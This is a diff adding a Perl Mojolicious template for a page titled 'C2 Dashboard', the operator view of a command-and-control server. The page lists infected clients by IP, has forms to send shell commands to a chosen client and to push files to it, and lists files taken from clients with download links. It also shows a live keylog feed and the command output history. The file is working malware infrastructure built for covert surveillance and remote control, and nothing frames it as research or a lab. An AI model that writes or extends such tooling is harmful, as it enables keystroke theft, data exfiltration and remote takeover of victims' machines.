@@ -1,0 +1,116 @@
+<%== include &apos;layouts/main&apos;, title => &apos;Dashboard&apos; %>
+
+<div class="container-fluid mt-3">
+    <h1>C2 Dashboard</h1>
+
+    <% if (my $success = flash(&apos;success&apos;)) { %>
+        <div class="alert alert-success"><%= $success %></div>
+    <% } %>
+    <% if (my $error = flash(&apos;error&apos;)) { %>
+        <div class="alert alert-danger"><%= $error %></div>
+    <% } %>
+
+    <div class="row">
+        <!-- Clients Section -->
+        <div class="col-md-4">
+            <h2>Connected Clients</h2>
+            <ul class="list-group">
+                <% for my $client (@$clients) { %>
+                    <li class="list-group-item">
+                        <strong>ID:</strong> <%= $client->{ip} %><br>
+                        <strong>Last Seen:</strong> <%= scalar localtime $client->{last_seen} %><br>
+                        <strong>Type:</strong> <%= $client->{type} %>
+                    </li>
+                <% } %>
+                <% unless (@$clients) { %>
+                    <li class="list-group-item">No connected clients.</li>
+                <% } %>
+            </ul>
+
+            <h2 class="mt-4">Send Command</h2>
+            <form action="<%= url_for(&apos;dashboard/command&apos;) %>" method="post">
+                <div class="mb-3">
+                    <label for="client_id" class="form-label">Client ID (IP)</label>
+                    <select class="form-select" id="client_id" name="client_id" required>
+                        <option value="">Select Client</option>
+                        <% for my $client (@$clients) { %>
+                            <option value="<%= $client->{ip} %>"><%= $client->{ip} %></option>
+                        <% } %>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label for="command" class="form-label">Command</label>
+                    <input type="text" class="form-control" id="command" name="command" required>
+                </div>
+                <button type="submit" class="btn btn-primary">Send Command</button>
+            </form>
+
+            <h2 class="mt-4">Upload File to Client</h2>
+            <form action="<%= url_for(&apos;dashboard/upload&apos;) %>" method="post" enctype="multipart/form-data">
+                 <div class="mb-3">
+                    <label for="upload_client_id" class="form-label">Client ID (IP)</label>
+                    <select class="form-select" id="upload_client_id" name="client_id" required>
+                        <option value="">Select Client</option>
+                        <% for my $client (@$clients) { %>
+                            <option value="<%= $client->{ip} %>"><%= $client->{ip} %></option>
+                        <% } %>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label for="file" class="form-label">Select File</label>
+                    <input type="file" class="form-control" id="file" name="file" required>
+                </div>
+                <button type="submit" class="btn btn-primary">Upload File</button>
+            </form>
+
+             <h2 class="mt-4">Uploaded Files (from Clients)</h2>
+             <ul class="list-group">
+                 <%
+                 # List files in the upload directory, grouped by client IP
+                 my @uploaded_files;
+                 if (-d $upload_dir) {
+                     opendir my $dh, $upload_dir or die "Cannot open directory $upload_dir: $!";
+                     while (my $client_dir = readdir $dh) {
+                         next if $client_dir =~ /^\./; # Skip hidden files/dirs
+                         my $client_upload_path = "$upload_dir/$client_dir";
+                         if (-d $client_upload_path) {
+                             opendir my $cdh, $client_upload_path or die "Cannot open directory $client_upload_path: $!";
+                             while (my $file = readdir $cdh) {
+                                 next if $file =~ /^\./;
+                                 push @uploaded_files, { client_id => $client_dir, filename => $file };
+                             }
+                             closedir $cdh;
+                         }
+                     }
+                     closedir $dh;
+                 }
+                 %>
+                 <% for my $file_info (@uploaded_files) { %>
+                     <li class="list-group-item d-flex justify-content-between align-items-center">
+                         <%= $file_info->{client_id} %> / <%= $file_info->{filename} %>
+                         <a href="<%= url_for(&apos;admin/download&apos;, client_id => $file_info->{client_id}, filename => $file_info->{filename}) %>" class="btn btn-sm btn-success">Download</a>
+                     </li>
+                 <% } %>
+                 <% unless (@uploaded_files) { %>
+                     <li class="list-group-item">No files uploaded yet.</li>
+                 <% } %>
+             </ul>
+
+
+        </div>
+
+        <!-- Logs Section -->
+        <div class="col-md-8">
+            <h2>Keylog Feed</h2>
+            <pre class="bg-light p-2 rounded" style="max-height: 400px; overflow-y: scroll;"><%= $keylogs %></pre>
+
+            <h2 class="mt-4">Command Output History</h2>
+            <pre class="bg-light p-2 rounded" style="max-height: 400px; overflow-y: scroll;"><%= $cmd_outputs %></pre>
+        </div>
+    </div>
+</div>
+
+<%== include &apos;layouts/footer&apos; %>
+
+<!-- Optional: Add AJAX polling or Websockets for real-time updates -->
+<!-- For simplicity, this version requires manual page refresh -->
